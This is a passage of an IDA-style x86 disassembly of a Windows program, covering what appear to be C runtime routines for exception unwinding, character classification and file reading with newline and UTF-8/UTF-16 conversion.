                pop     esi
                pop     ebp
                retn
sub_413C42      endp


; =============== S U B R O U T I N E =======================================


sub_413C59      proc near               ; CODE XREF: SEH_4132F0+167↑p
                mov     ebp, edx
                mov     esi, ecx
                mov     eax, ecx
                push    1
                call    sub_41AB71
                xor     eax, eax
                xor     ebx, ebx
                xor     ecx, ecx
                xor     edx, edx
                xor     edi, edi
                jmp     esi
sub_413C59      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __thiscall sub_413C72(PVOID TargetFrame)
sub_413C72      proc near               ; CODE XREF: SEH_4132F0+116↑p
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                push    0               ; ReturnValue
                push    0               ; ExceptionRecord
                push    offset loc_413C87 ; TargetIp
                push    ecx             ; TargetFrame
                call    RtlUnwind

loc_413C87:                             ; DATA XREF: sub_413C72+A↑o
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_413C72      endp


; =============== S U B R O U T I N E =======================================


sub_413C8C      proc near               ; CODE XREF: SEH_4132F0+12D↑p
                                        ; SEH_4132F0+182↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebp
                mov     ebp, [esp+4+arg_0]
                push    edx
                push    ecx
                push    [esp+0Ch+arg_4]
                call    sub_413B50
                add     esp, 0Ch
                pop     ebp
                retn    8
sub_413C8C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413CA3      proc near               ; CODE XREF: sub_40ED65+2B↑p
                                        ; sub_40EDEB+28↑p ...

var_18          = dword ptr -18h
var_10          = dword ptr -10h
var_C           = byte ptr -0Ch
MultiByteStr    = byte ptr -8
var_7           = byte ptr -7
var_6           = byte ptr -6
CharType        = word ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    ebx
                push    [ebp+arg_8]
                lea     ecx, [ebp+var_18]
                call    sub_40E461
                mov     ebx, [ebp+arg_0]
                lea     eax, [ebx+1]
                cmp     eax, 100h
                ja      short loc_413CD3
                mov     eax, [ebp+var_18]
                mov     eax, [eax+0C8h]
                movzx   eax, word ptr [eax+ebx*2]
                jmp     short loc_413D48
; ---------------------------------------------------------------------------

loc_413CD3:                             ; CODE XREF: sub_413CA3+1F↑j
                mov     [ebp+arg_0], ebx
                sar     [ebp+arg_0], 8
                lea     eax, [ebp+var_18]
                push    eax
                mov     eax, [ebp+arg_0]
                and     eax, 0FFh
                push    eax
                call    sub_418D37
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_413D04
                mov     al, byte ptr [ebp+arg_0]
                push    2
                mov     [ebp+MultiByteStr], al
                mov     [ebp+var_7], bl
                mov     [ebp+var_6], 0
                pop     ecx
                jmp     short loc_413D0E
; ---------------------------------------------------------------------------

loc_413D04:                             ; CODE XREF: sub_413CA3+4D↑j
                xor     ecx, ecx
                mov     [ebp+MultiByteStr], bl
                mov     [ebp+var_7], 0
                inc     ecx

loc_413D0E:                             ; CODE XREF: sub_413CA3+5F↑j
                mov     eax, [ebp+var_18]
                push    1               ; int
                push    dword ptr [eax+14h] ; Locale
                push    dword ptr [eax+4] ; CodePage
                lea     eax, [ebp+CharType]
                push    eax             ; lpCharType
                push    ecx             ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                lea     eax, [ebp+var_18]
                push    1               ; dwInfoType
                push    eax             ; int
                call    sub_4193E9
                add     esp, 20h
                test    eax, eax
                jnz     short loc_413D44
                cmp     [ebp+var_C], al
                jz      short loc_413D40
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_413D40:                             ; CODE XREF: sub_413CA3+94↑j
                xor     eax, eax
                jmp     short loc_413D58
; ---------------------------------------------------------------------------

loc_413D44:                             ; CODE XREF: sub_413CA3+8F↑j
                movzx   eax, [ebp+CharType]

loc_413D48:                             ; CODE XREF: sub_413CA3+2E↑j
                and     eax, [ebp+arg_4]
                cmp     [ebp+var_C], 0
                jz      short loc_413D58
                mov     ecx, [ebp+var_10]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

loc_413D58:                             ; CODE XREF: sub_413CA3+9F↑j
                                        ; sub_413CA3+AC↑j
                pop     ebx
                leave
                retn
sub_413CA3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413D5B      proc near               ; CODE XREF: sub_40EE6A+162↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                xor     edi, edi
                cmp     esi, edi
                jnz     short loc_413D88
                call    sub_41090E
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                jmp     loc_413E7F
; ---------------------------------------------------------------------------

loc_413D88:                             ; CODE XREF: sub_413D5B+E↑j
                mov     eax, [esi+0Ch]
                test    al, 83h
                jz      loc_413E7F
                test    al, 40h
                jnz     loc_413E7F
                test    al, 2
                jz      short loc_413DAA
                or      eax, 20h
                mov     [esi+0Ch], eax
                jmp     loc_413E7F
; ---------------------------------------------------------------------------

loc_413DAA:                             ; CODE XREF: sub_413D5B+42↑j
                or      eax, 1
                mov     [esi+0Ch], eax
                test    eax, 10Ch
                jnz     short loc_413DC0
                push    esi
                call    sub_418ACA
                pop     ecx
                jmp     short loc_413DC5
; ---------------------------------------------------------------------------

loc_413DC0:                             ; CODE XREF: sub_413D5B+5A↑j
                mov     eax, [esi+8]
                mov     [esi], eax

loc_413DC5:                             ; CODE XREF: sub_413D5B+63↑j
                push    dword ptr [esi+18h] ; nNumberOfBytesToRead
                push    dword ptr [esi+8] ; lpBuffer
                push    esi
                call    sub_40F9B4
                pop     ecx
                push    eax             ; int
                call    sub_414448
                add     esp, 0Ch
                mov     [esi+4], eax
                cmp     eax, edi
                jz      loc_413E6F
                cmp     eax, 0FFFFFFFFh
                jz      loc_413E6F
                test    byte ptr [esi+0Ch], 82h
                jnz     short loc_413E44
                push    esi
                call    sub_40F9B4
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_413E2F
                push    esi
                call    sub_40F9B4
                pop     ecx
                cmp     eax, 0FFFFFFFEh
                jz      short loc_413E2F
                push    esi
                call    sub_40F9B4
                sar     eax, 5
                push    esi
                lea     edi, dword_42CA00[eax*4]
                call    sub_40F9B4
                and     eax, 1Fh
                pop     ecx
                shl     eax, 6
                add     eax, [edi]
                pop     ecx
                jmp     short loc_413E34
; ---------------------------------------------------------------------------

loc_413E2F:                             ; CODE XREF: sub_413D5B+A4↑j
                                        ; sub_413D5B+B0↑j
                mov     eax, offset unk_425B80

loc_413E34:                             ; CODE XREF: sub_413D5B+D2↑j
                mov     al, [eax+4]
                and     al, 82h
                cmp     al, 82h
                jnz     short loc_413E44
                or      dword ptr [esi+0Ch], 2000h

loc_413E44:                             ; CODE XREF: sub_413D5B+98↑j
                                        ; sub_413D5B+E0↑j
                cmp     dword ptr [esi+18h], 200h
                jnz     short loc_413E62
                mov     eax, [esi+0Ch]
                test    al, 8
                jz      short loc_413E62
                test    eax, 400h
                jnz     short loc_413E62
                mov     dword ptr [esi+18h], 1000h

loc_413E62:                             ; CODE XREF: sub_413D5B+F0↑j
                                        ; sub_413D5B+F7↑j ...
                mov     ecx, [esi]
                dec     dword ptr [esi+4]
                movzx   eax, byte ptr [ecx]
                inc     ecx
                mov     [esi], ecx
                jmp     short loc_413E82
; ---------------------------------------------------------------------------

loc_413E6F:                             ; CODE XREF: sub_413D5B+85↑j
                                        ; sub_413D5B+8E↑j
                neg     eax
                sbb     eax, eax
                and     eax, 10h
                add     eax, 10h
                or      [esi+0Ch], eax
                mov     [esi+4], edi

loc_413E7F:                             ; CODE XREF: sub_413D5B+28↑j
                                        ; sub_413D5B+32↑j ...
                or      eax, 0FFFFFFFFh

loc_413E82:                             ; CODE XREF: sub_413D5B+112↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_413D5B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_413E86(int, LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
sub_413E86      proc near               ; CODE XREF: sub_414448+BB↓p
                                        ; sub_419E86+3AA↓p ...

var_1C          = dword ptr -1Ch
NumberOfBytesRead= dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
lpMultiByteStr  = dword ptr -0Ch
var_8           = word ptr -8
var_2           = byte ptr -2
Buffer          = byte ptr -1
arg_0           = dword ptr  8
lpBuffer        = dword ptr  0Ch
nNumberOfBytesToRead= dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 1Ch
                mov     edx, [ebp+nNumberOfBytesToRead]
                push    esi
                mov     esi, [ebp+arg_0]
                push    0FFFFFFFEh
                pop     eax
                mov     [ebp+var_14], eax
                mov     [ebp+var_1C], edx
                cmp     esi, eax
                jnz     short loc_413EBD
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9
                or      eax, 0FFFFFFFFh
                jmp     loc_414445
; ---------------------------------------------------------------------------

loc_413EBD:                             ; CODE XREF: sub_413E86+1A↑j
                push    ebx
                xor     ebx, ebx
                cmp     esi, ebx
                jl      short loc_413ECC
                cmp     esi, uNumber
                jb      short loc_413EF3

loc_413ECC:                             ; CODE XREF: sub_413E86+3C↑j
                call    sub_410921
                mov     [eax], ebx
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 9
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     loc_414444
; ---------------------------------------------------------------------------

loc_413EF3:                             ; CODE XREF: sub_413E86+44↑j
                mov     eax, esi
                sar     eax, 5
                push    edi
                lea     edi, dword_42CA00[eax*4]
                mov     eax, [edi]
                and     esi, 1Fh
                shl     esi, 6
                add     eax, esi
                mov     cl, [eax+4]
                test    cl, 1
                jnz     short loc_413F26
                call    sub_410921
                mov     [eax], ebx
                call    sub_41090E
                mov     dword ptr [eax], 9
                jmp     short loc_413F90
; ---------------------------------------------------------------------------

loc_413F26:                             ; CODE XREF: sub_413E86+8A↑j
                cmp     edx, 7FFFFFFFh
                ja      short loc_413F7E
                mov     [ebp+var_10], ebx
                cmp     edx, ebx
                jz      loc_414441
                test    cl, 2
                jnz     loc_414441
                cmp     [ebp+lpBuffer], ebx
                jz      short loc_413F7E
                mov     al, [eax+24h]
                add     al, al
                sar     al, 1
                mov     [ebp+var_2], al
                movsx   eax, al
                dec     eax
                push    4
                pop     ecx
                jz      short loc_413F76
                dec     eax
                jnz     short loc_413F6B
                mov     eax, edx
                not     eax
                test    al, 1
                jz      short loc_413F7E
                and     edx, 0FFFFFFFEh
                mov     [ebp+nNumberOfBytesToRead], edx

loc_413F6B:                             ; CODE XREF: sub_413E86+D5↑j
                mov     eax, [ebp+lpBuffer]
                mov     [ebp+lpMultiByteStr], eax
                jmp     loc_413FF7
; ---------------------------------------------------------------------------

loc_413F76:                             ; CODE XREF: sub_413E86+D2↑j
                mov     eax, edx
                not     eax
                test    al, 1
                jnz     short loc_413F9F

loc_413F7E:                             ; CODE XREF: sub_413E86+A6↑j
                                        ; sub_413E86+BF↑j ...
                call    sub_410921
                mov     [eax], ebx
                call    sub_41090E
                mov     dword ptr [eax], 16h

loc_413F90:                             ; CODE XREF: sub_413E86+9E↑j
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_413FD3
; ---------------------------------------------------------------------------

loc_413F9F:                             ; CODE XREF: sub_413E86+F6↑j
                mov     eax, edx
                shr     eax, 1
                mov     [ebp+nNumberOfBytesToRead], ecx
                cmp     eax, ecx
                jb      short loc_413FAD
                mov     [ebp+nNumberOfBytesToRead], eax

loc_413FAD:                             ; CODE XREF: sub_413E86+122↑j
                push    [ebp+nNumberOfBytesToRead]
                call    sub_412BB3
                pop     ecx
                mov     [ebp+lpMultiByteStr], eax
                cmp     eax, ebx
                jnz     short loc_413FDB
                call    sub_41090E
                mov     dword ptr [eax], 0Ch
                call    sub_410921
                mov     dword ptr [eax], 8

loc_413FD3:                             ; CODE XREF: sub_413E86+117↑j
                or      eax, 0FFFFFFFFh
                jmp     loc_414443
; ---------------------------------------------------------------------------

loc_413FDB:                             ; CODE XREF: sub_413E86+135↑j
                push    1               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                mov     ecx, [edi]
                mov     [esi+ecx+28h], eax
                mov     eax, [ebp+lpMultiByteStr]
                add     esp, 10h
                mov     [esi+ecx+2Ch], edx

loc_413FF7:                             ; CODE XREF: sub_413E86+EB↑j
                mov     ecx, [edi]
                add     ecx, esi
                test    byte ptr [ecx+4], 48h
                jz      short loc_414075
                mov     cl, [ecx+5]
                cmp     cl, 0Ah
                jz      short loc_414075
                cmp     [ebp+nNumberOfBytesToRead], ebx
                jz      short loc_414075
                mov     [eax], cl
                mov     ecx, [edi]
                inc     eax
                dec     [ebp+nNumberOfBytesToRead]
                mov     [ebp+var_10], 1
                mov     byte ptr [esi+ecx+5], 0Ah
                cmp     [ebp+var_2], bl
                jz      short loc_414075
                mov     ecx, [edi]
                mov     cl, [esi+ecx+25h]
                cmp     cl, 0Ah
                jz      short loc_414075
                cmp     [ebp+nNumberOfBytesToRead], ebx
                jz      short loc_414075
                mov     [eax], cl
                mov     ecx, [edi]
                inc     eax
                dec     [ebp+nNumberOfBytesToRead]
                cmp     [ebp+var_2], 1
                mov     [ebp+var_10], 2
                mov     byte ptr [esi+ecx+25h], 0Ah
                jnz     short loc_414075
                mov     ecx, [edi]
                mov     cl, [esi+ecx+26h]
                cmp     cl, 0Ah
                jz      short loc_414075
                cmp     [ebp+nNumberOfBytesToRead], ebx
                jz      short loc_414075
                mov     [eax], cl
                mov     ecx, [edi]
                inc     eax
                dec     [ebp+nNumberOfBytesToRead]
                mov     [ebp+var_10], 3
                mov     byte ptr [esi+ecx+26h], 0Ah

loc_414075:                             ; CODE XREF: sub_413E86+179↑j
                                        ; sub_413E86+181↑j ...
                push    ebx             ; lpOverlapped
                lea     ecx, [ebp+NumberOfBytesRead]
                push    ecx             ; lpNumberOfBytesRead
                push    [ebp+nNumberOfBytesToRead] ; nNumberOfBytesToRead
                push    eax             ; lpBuffer
                mov     eax, [edi]
                push    dword ptr [esi+eax] ; hFile
                call    ds:ReadFile
                test    eax, eax
                jz      loc_41440C
                mov     ecx, [ebp+NumberOfBytesRead]
                cmp     ecx, ebx
                jl      loc_41440C
                cmp     ecx, [ebp+nNumberOfBytesToRead]
                ja      loc_41440C
                mov     eax, [edi]
                add     [ebp+var_10], ecx
                lea     eax, [esi+eax+4]
                test    byte ptr [eax], 80h
                jz      loc_41429D
                cmp     [ebp+var_2], 2
                jz      loc_4142D7
                cmp     ecx, ebx
                jz      short loc_4140D2
                mov     ecx, [ebp+lpMultiByteStr]
                cmp     byte ptr [ecx], 0Ah
                jnz     short loc_4140D2
                or      byte ptr [eax], 4
                jmp     short loc_4140D5
; ---------------------------------------------------------------------------

loc_4140D2:                             ; CODE XREF: sub_413E86+23D↑j
                                        ; sub_413E86+245↑j
                and     byte ptr [eax], 0FBh

loc_4140D5:                             ; CODE XREF: sub_413E86+24A↑j
                mov     ebx, [ebp+lpMultiByteStr]
                mov     eax, [ebp+var_10]
                add     eax, ebx
                mov     [ebp+nNumberOfBytesToRead], ebx
                mov     [ebp+var_10], eax
                cmp     ebx, eax
                jnb     loc_4141BB

loc_4140EB:                             ; CODE XREF: sub_413E86+318↓j
                mov     ecx, [ebp+nNumberOfBytesToRead]
                mov     al, [ecx]
                cmp     al, 1Ah
                jz      loc_4141A6
                cmp     al, 0Dh
                jz      short loc_414108
                mov     [ebx], al
                inc     ebx
                inc     ecx
                mov     [ebp+nNumberOfBytesToRead], ecx
                jmp     loc_414198
; ---------------------------------------------------------------------------

loc_414108:                             ; CODE XREF: sub_413E86+274↑j
                mov     eax, [ebp+var_10]
                dec     eax
                cmp     ecx, eax
                jnb     short loc_414127
                lea     eax, [ecx+1]
                cmp     byte ptr [eax], 0Ah
                jnz     short loc_414122
                inc     ecx
                inc     ecx
                mov     [ebp+nNumberOfBytesToRead], ecx

loc_41411D:                             ; CODE XREF: sub_413E86+2DC↓j
                                        ; sub_413E86+2F5↓j
                mov     byte ptr [ebx], 0Ah
                jmp     short loc_414197
; ---------------------------------------------------------------------------

loc_414122:                             ; CODE XREF: sub_413E86+290↑j
                mov     [ebp+nNumberOfBytesToRead], eax
                jmp     short loc_414194
; ---------------------------------------------------------------------------

loc_414127:                             ; CODE XREF: sub_413E86+288↑j
                inc     [ebp+nNumberOfBytesToRead]
                push    0               ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                push    1               ; nNumberOfBytesToRead
                lea     eax, [ebp+Buffer]
                push    eax             ; lpBuffer
                mov     eax, [edi]
                push    dword ptr [esi+eax] ; hFile
                call    ds:ReadFile
                test    eax, eax
                jnz     short loc_41414F
                call    ds:GetLastError
                test    eax, eax
                jnz     short loc_414194

loc_41414F:                             ; CODE XREF: sub_413E86+2BD↑j
                cmp     [ebp+NumberOfBytesRead], 0
                jz      short loc_414194
                mov     eax, [edi]
                test    byte ptr [esi+eax+4], 48h
                jz      short loc_414172
                cmp     [ebp+Buffer], 0Ah
                jz      short loc_41411D
                mov     byte ptr [ebx], 0Dh
                mov     eax, [edi]
                mov     cl, [ebp+Buffer]
                mov     [esi+eax+5], cl
                jmp     short loc_414197
; ---------------------------------------------------------------------------

loc_414172:                             ; CODE XREF: sub_413E86+2D6↑j
                cmp     ebx, [ebp+lpMultiByteStr]
                jnz     short loc_41417D
                cmp     [ebp+Buffer], 0Ah
                jz      short loc_41411D

loc_41417D:                             ; CODE XREF: sub_413E86+2EF↑j
                push    1               ; dwMoveMethod
                push    0FFFFFFFFh      ; int
                push    0FFFFFFFFh      ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                add     esp, 10h
                cmp     [ebp+Buffer], 0Ah
                jz      short loc_414198

loc_414194:                             ; CODE XREF: sub_413E86+29F↑j
                                        ; sub_413E86+2C7↑j ...
                mov     byte ptr [ebx], 0Dh

loc_414197:                             ; CODE XREF: sub_413E86+29A↑j
                                        ; sub_413E86+2EA↑j
                inc     ebx

loc_414198:                             ; CODE XREF: sub_413E86+27D↑j
                                        ; sub_413E86+30C↑j
                mov     eax, [ebp+var_10]
                cmp     [ebp+nNumberOfBytesToRead], eax
                jb      loc_4140EB
                jmp     short loc_4141BB
; ---------------------------------------------------------------------------

loc_4141A6:                             ; CODE XREF: sub_413E86+26C↑j
                mov     eax, [edi]
                lea     eax, [esi+eax+4]
                test    byte ptr [eax], 40h
                jnz     short loc_4141B6
                or      byte ptr [eax], 2
                jmp     short loc_4141BB
; ---------------------------------------------------------------------------

loc_4141B6:                             ; CODE XREF: sub_413E86+329↑j
                mov     al, [ecx]
                mov     [ebx], al
                inc     ebx

loc_4141BB:                             ; CODE XREF: sub_413E86+25F↑j
                                        ; sub_413E86+31E↑j ...
                mov     eax, ebx
                sub     eax, [ebp+lpMultiByteStr]
                cmp     [ebp+var_2], 1
                mov     [ebp+var_10], eax
                jnz     loc_41429D
                test    eax, eax
                jz      loc_41429D
                dec     ebx
                mov     cl, [ebx]
                test    cl, cl
                js      short loc_4141E2
                inc     ebx
                jmp     loc_414268
; ---------------------------------------------------------------------------

loc_4141E2:                             ; CODE XREF: sub_413E86+354↑j
                xor     eax, eax
                inc     eax
                movzx   ecx, cl
                jmp     short loc_4141F9
; ---------------------------------------------------------------------------

loc_4141EA:                             ; CODE XREF: sub_413E86+37A↓j
                cmp     eax, 4
                jg      short loc_414202
                cmp     ebx, [ebp+lpMultiByteStr]
                jb      short loc_414202
                dec     ebx
                movzx   ecx, byte ptr [ebx]
                inc     eax

loc_4141F9:                             ; CODE XREF: sub_413E86+362↑j
                cmp     byte_425A80[ecx], 0
                jz      short loc_4141EA

loc_414202:                             ; CODE XREF: sub_413E86+367↑j
                                        ; sub_413E86+36C↑j
                mov     dl, [ebx]
                movzx   ecx, dl
                movsx   ecx, byte_425A80[ecx]
                test    ecx, ecx
                jnz     short loc_41421F
                call    sub_41090E
                mov     dword ptr [eax], 2Ah
                jmp     short loc_414299
; ---------------------------------------------------------------------------

loc_41421F:                             ; CODE XREF: sub_413E86+38A↑j
                inc     ecx
                cmp     ecx, eax
                jnz     short loc_414228
                add     ebx, eax
                jmp     short loc_414268
; ---------------------------------------------------------------------------

loc_414228:                             ; CODE XREF: sub_413E86+39C↑j
                mov     ecx, [edi]
                add     ecx, esi
                test    byte ptr [ecx+4], 48h
                jz      short loc_414256
                inc     ebx
                cmp     eax, 2
                mov     [ecx+5], dl
                jl      short loc_414244
                mov     dl, [ebx]
                mov     ecx, [edi]
                mov     [esi+ecx+25h], dl
                inc     ebx

loc_414244:                             ; CODE XREF: sub_413E86+3B3↑j
                cmp     eax, 3
                jnz     short loc_414252
                mov     dl, [ebx]
                mov     ecx, [edi]
                mov     [esi+ecx+26h], dl
                inc     ebx

loc_414252:                             ; CODE XREF: sub_413E86+3C1↑j
                sub     ebx, eax
                jmp     short loc_414268
; ---------------------------------------------------------------------------

loc_414256:                             ; CODE XREF: sub_413E86+3AA↑j
                neg     eax
                cdq
                push    1               ; dwMoveMethod
                push    edx             ; int
                push    eax             ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                add     esp, 10h

loc_414268:                             ; CODE XREF: sub_413E86+357↑j
                                        ; sub_413E86+3A0↑j ...
                mov     eax, [ebp+var_1C]
                sub     ebx, [ebp+lpMultiByteStr]
                shr     eax, 1
                push    eax             ; cchWideChar
                push    [ebp+lpBuffer]  ; lpWideCharStr
                push    ebx             ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    0               ; dwFlags
                push    0FDE9h          ; CodePage
                call    ds:MultiByteToWideChar
                mov     [ebp+var_10], eax
                test    eax, eax
                jnz     short loc_4142C0
                call    ds:GetLastError

loc_414292:                             ; CODE XREF: sub_413E86+5AD↓j
                push    eax
                call    sub_410934
                pop     ecx

loc_414299:                             ; CODE XREF: sub_413E86+397↑j
                                        ; sub_413E86+5A5↓j
                or      [ebp+var_14], 0FFFFFFFFh

loc_41429D:                             ; CODE XREF: sub_413E86+22B↑j
                                        ; sub_413E86+341↑j ...
                mov     eax, [ebp+lpMultiByteStr]
                cmp     eax, [ebp+lpBuffer]
                jz      short loc_4142AC
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4142AC:                             ; CODE XREF: sub_413E86+41D↑j
                mov     eax, [ebp+var_14]
                cmp     eax, 0FFFFFFFEh
                jnz     loc_414443
                mov     eax, [ebp+var_10]
                jmp     loc_414443
; ---------------------------------------------------------------------------

loc_4142C0:                             ; CODE XREF: sub_413E86+404↑j
                mov     eax, [ebp+var_10]
                mov     edx, [edi]
                xor     ecx, ecx
                cmp     eax, ebx
                setnz   cl
                add     eax, eax
                mov     [ebp+var_10], eax
                mov     [esi+edx+30h], ecx
                jmp     short loc_41429D
; ---------------------------------------------------------------------------

loc_4142D7:                             ; CODE XREF: sub_413E86+235↑j
                cmp     ecx, ebx
                jz      short loc_4142E9
                mov     ecx, [ebp+lpMultiByteStr]
                cmp     word ptr [ecx], 0Ah
                jnz     short loc_4142E9
                or      byte ptr [eax], 4
                jmp     short loc_4142EC
; ---------------------------------------------------------------------------

loc_4142E9:                             ; CODE XREF: sub_413E86+453↑j
                                        ; sub_413E86+45C↑j
                and     byte ptr [eax], 0FBh

loc_4142EC:                             ; CODE XREF: sub_413E86+461↑j
                mov     ebx, [ebp+lpMultiByteStr]
                mov     eax, [ebp+var_10]
                add     eax, ebx
                mov     [ebp+nNumberOfBytesToRead], ebx
                mov     [ebp+var_10], eax
                cmp     ebx, eax
                jnb     loc_414401

loc_414302:                             ; CODE XREF: sub_413E86+55B↓j
                mov     eax, [ebp+nNumberOfBytesToRead]
                movzx   ecx, word ptr [eax]
                cmp     cx, 1Ah
                jz      loc_4143E9
                cmp     cx, 0Dh
                jz      short loc_414327
                mov     [ebx], cx
                inc     ebx
                inc     ebx
                inc     eax
                inc     eax
                mov     [ebp+nNumberOfBytesToRead], eax
                jmp     loc_4143DB
; ---------------------------------------------------------------------------

loc_414327:                             ; CODE XREF: sub_413E86+490↑j
                mov     ecx, [ebp+var_10]
                add     ecx, 0FFFFFFFEh
                cmp     eax, ecx
                jnb     short loc_41434F
                lea     ecx, [eax+2]
                cmp     word ptr [ecx], 0Ah
                jnz     short loc_414347
                add     eax, 4
                mov     [ebp+nNumberOfBytesToRead], eax

loc_414340:                             ; CODE XREF: sub_413E86+506↓j
                                        ; sub_413E86+533↓j
                push    0Ah
                jmp     loc_4143D5
; ---------------------------------------------------------------------------

loc_414347:                             ; CODE XREF: sub_413E86+4B2↑j
                mov     [ebp+nNumberOfBytesToRead], ecx
                jmp     loc_4143D3
; ---------------------------------------------------------------------------

loc_41434F:                             ; CODE XREF: sub_413E86+4A9↑j
                add     [ebp+nNumberOfBytesToRead], 2
                push    0               ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                push    2               ; nNumberOfBytesToRead
                lea     eax, [ebp+var_8]
                push    eax             ; lpBuffer
                mov     eax, [edi]
                push    dword ptr [esi+eax] ; hFile
                call    ds:ReadFile
                test    eax, eax
                jnz     short loc_414378
                call    ds:GetLastError
                test    eax, eax
                jnz     short loc_4143D3

loc_414378:                             ; CODE XREF: sub_413E86+4E6↑j
                cmp     [ebp+NumberOfBytesRead], 0
                jz      short loc_4143D3
                mov     eax, [edi]
                test    byte ptr [esi+eax+4], 48h
                jz      short loc_4143AF
                cmp     [ebp+var_8], 0Ah
                jz      short loc_414340
                push    0Dh
                pop     eax
                mov     [ebx], ax
                mov     eax, [edi]
                mov     cl, byte ptr [ebp+var_8]
                mov     [esi+eax+5], cl
                mov     eax, [edi]
                mov     cl, byte ptr [ebp+var_8+1]
                mov     [esi+eax+25h], cl
                mov     eax, [edi]
                mov     byte ptr [esi+eax+26h], 0Ah
                jmp     short loc_4143D9
; ---------------------------------------------------------------------------

loc_4143AF:                             ; CODE XREF: sub_413E86+4FF↑j
                cmp     ebx, [ebp+lpMultiByteStr]
                jnz     short loc_4143BB
                cmp     [ebp+var_8], 0Ah
                jz      short loc_414340

loc_4143BB:                             ; CODE XREF: sub_413E86+52C↑j
                push    1               ; dwMoveMethod
                push    0FFFFFFFFh      ; int
                push    0FFFFFFFEh      ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                add     esp, 10h
                cmp     [ebp+var_8], 0Ah
                jz      short loc_4143DB

loc_4143D3:                             ; CODE XREF: sub_413E86+4C4↑j
                                        ; sub_413E86+4F0↑j ...
                push    0Dh

loc_4143D5:                             ; CODE XREF: sub_413E86+4BC↑j
                pop     eax
                mov     [ebx], ax

loc_4143D9:                             ; CODE XREF: sub_413E86+527↑j
                inc     ebx
                inc     ebx

loc_4143DB:                             ; CODE XREF: sub_413E86+49C↑j
                                        ; sub_413E86+54B↑j
                mov     eax, [ebp+var_10]
                cmp     [ebp+nNumberOfBytesToRead], eax
                jb      loc_414302
                jmp     short loc_414401
; ---------------------------------------------------------------------------

loc_4143E9:                             ; CODE XREF: sub_413E86+486↑j
                mov     ecx, [edi]
                lea     esi, [esi+ecx+4]
                test    byte ptr [esi], 40h
                jnz     short loc_4143F9
                or      byte ptr [esi], 2
                jmp     short loc_414401
; ---------------------------------------------------------------------------

loc_4143F9:                             ; CODE XREF: sub_413E86+56C↑j
                mov     ax, [eax]
                mov     [ebx], ax
                inc     ebx
                inc     ebx

loc_414401:                             ; CODE XREF: sub_413E86+476↑j
                                        ; sub_413E86+561↑j ...
                sub     ebx, [ebp+lpMultiByteStr]
                mov     [ebp+var_10], ebx
                jmp     loc_41429D
; ---------------------------------------------------------------------------

loc_41440C:                             ; CODE XREF: sub_413E86+205↑j
                                        ; sub_413E86+210↑j ...
                call    ds:GetLastError
                push    5
                pop     esi
                cmp     eax, esi
                jnz     short loc_414430
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], esi
                jmp     loc_414299
; ---------------------------------------------------------------------------

loc_414430:                             ; CODE XREF: sub_413E86+591↑j
                cmp     eax, 6Dh
                jnz     loc_414292
                mov     [ebp+var_14], ebx
                jmp     loc_41429D
; ---------------------------------------------------------------------------

loc_414441:                             ; CODE XREF: sub_413E86+AD↑j
                                        ; sub_413E86+B6↑j
                xor     eax, eax

loc_414443:                             ; CODE XREF: sub_413E86+150↑j
                                        ; sub_413E86+42C↑j ...
                pop     edi

loc_414444:                             ; CODE XREF: sub_413E86+68↑j
                pop     ebx

loc_414445:                             ; CODE XREF: sub_413E86+32↑j
                pop     esi
                leave
                retn
sub_413E86      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_414448(int, LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
sub_414448      proc near               ; CODE XREF: sub_40EE6A+13E↑p
                                        ; sub_413D5B+78↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
lpBuffer        = dword ptr  0Ch
nNumberOfBytesToRead= dword ptr  10h

                push    10h
                push    offset stru_422EB8
                call    __SEH_prolog4
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_414477
